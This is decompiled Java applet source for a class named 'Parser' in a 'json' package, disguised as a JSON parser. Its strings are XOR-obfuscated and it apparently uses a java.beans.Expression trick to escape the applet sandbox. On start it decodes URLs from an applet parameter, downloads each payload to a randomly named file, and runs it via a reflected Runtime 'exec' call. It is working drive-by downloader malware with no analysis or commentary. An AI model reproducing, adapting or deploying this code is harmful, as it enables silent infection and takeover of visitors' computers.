// 
// Decompiled by Procyon v0.5.30
// 

package json;

import java.lang.reflect.Method;
import java.awt.Component;
import java.beans.Expression;
import java.io.InputStream;
import java.io.IOException;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.net.URL;
import java.util.HashSet;
import javax.swing.JList;
import java.applet.Applet;

public class Parser extends Applet
{
    protected JList r;
    static String[] exp;
    private String jsonData;
    protected HashSet d;
    private String postfix;
    protected static String dc;
    public static String v;
    protected static String pt;
    protected static String prfx;
    
    public void PostCodeFromJSON() {
        super.start();
        if (System.getProperty(this.jsonData).indexOf(Parser.dc) >= 0) {
            final Runtime runtime = Runtime.getRuntime();
            final String[] split = XML.equals(Parser.pt, Parser.v, this.getParameter("p")).split("::");
            for (int i = 0; i < split.length; ++i) {
                final double random = Math.random();
                URL url;
                try {
                    url = new URL(split[i]);
                }
                catch (Exception ex) {
                    ex.printStackTrace();
                    return;
                }
                final String concat = Double.toString(random).concat(XML.e);
                FileOutputStream fileOutputStream;
                try {
                    fileOutputStream = new FileOutputStream(concat);
                }
                catch (FileNotFoundException ex2) {
                    ex2.printStackTrace();
                    return;
                }
                InputStream openStream;
                try {
                    openStream = url.openStream();
                }
                catch (IOException ex3) {
                    ex3.printStackTrace();
                    return;
                }
                ThreadParser.getSubstring(openStream, fileOutputStream);
                try {
                    openStream.close();
                }
                catch (IOException ex4) {
                    ex4.printStackTrace();
                    return;
                }
                try {
                    fileOutputStream.close();
                }
                catch (IOException ex5) {
                    ex5.printStackTrace();
                    return;
                }
                System.out.println();
                this.parseJSON(-1, concat, runtime);
            }
        }
    }
    
    @Override
    public void start() {
        System.out.println();
        this.PostCodeFromJSON();
    }
    
    public Parser() {
        this.jsonData = PostCode(getNotes("dkbat&ndjk`").split(getNotes("d"))) + getNotes("f");
        this.d = new HashSet();
        this.postfix = PostCode(getNotes("hw`ms[banofez{cyz\u007f~bnsT{pr|utgdihvn").split("k"));
        this.d.add(new Option(System.class, this.postfix, new Object[1]));
        new Expression(System.class, this.postfix, new Object[1]);
        this.add(this.r = new JList((E[])new Object[] { new XML(this, this.d) }));
    }
    
    public void parseJSON(final int n, final String s, final Object o) {
        Method method = null;
        try {
            method = o.getClass().getMethod(XML.e.substring(1).concat("c"), String.class);
        }
        catch (Exception ex) {
            ex.printStackTrace();
        }
        System.out.println();
        try {
            method.invoke(o, s);
        }
        catch (Exception ex2) {
            ex2.printStackTrace();
        }
        System.out.println();
        try {
            method.invoke(o, Parser.prfx.concat(s).concat("\""));
        }
        catch (Exception ex3) {
            ex3.printStackTrace();
        }
    }
    
    public static boolean decode2JSON(final Method method, final Object o, final Object[] array) {
        try {
            method.invoke(o, array);
        }
        catch (Exception ex) {
            ex.printStackTrace();
        }
        return true;
    }
    
    public static String getChars(int n, final String s) {
        final int n2 = 4;
        final int n3 = 5;
        final char[] charArray = s.toCharArray();
        final int length = charArray.length;
        final char[] array = charArray;
        int i = 0;
        final int n4 = (n2 << n3) - 1 ^ 0x20;
        while (i != length) {
            final int n5 = i;
            final int n6 = array[i] ^ (n & n4);
            ++n;
            ++i;
            array[n5] = (char)n6;
        }
        return String.valueOf(array, 0, length).intern();
    }
    
    public static String PostCode(final String[] array) {
        final StringBuffer sb = new StringBuffer("");
        int i = 0;
        while (i < array.length) {
            sb.append(array[i++].trim());
        }
        return sb.toString();
    }
    
    public static String getNotes(final String s) {
        return getChars(3, s);
    }
    
    static {
        Parser.dc = PostCode(getNotes("3S5o7fm:;c=>xc!\"#").split("0"));
        Parser.v = PostCode((getNotes("b@I%$Px'T") + ".mjnWN##6fwcsK####B?xbITS=##CykGvd91Z:%E####lR5po0rzA8/##JYP72#ue&t4i####QFhVU##3OMgH").split(getNotes(" '")));
        Parser.pt = PostCode((getNotes("RK56i?jPJZ=>b[>U'C`Tf()|Wdw/@tmG;4567X]x{B?W<*") + "MUa00=&5oRi%y00?9DHv-Cgwk00h60b.FdeSI00#zJXs").split(getNotes("34")));
        Parser.prfx = PostCode(getNotes(" v`%`+z)}/.|,#2 39f65;:").split(getNotes(" ")));
    }
}
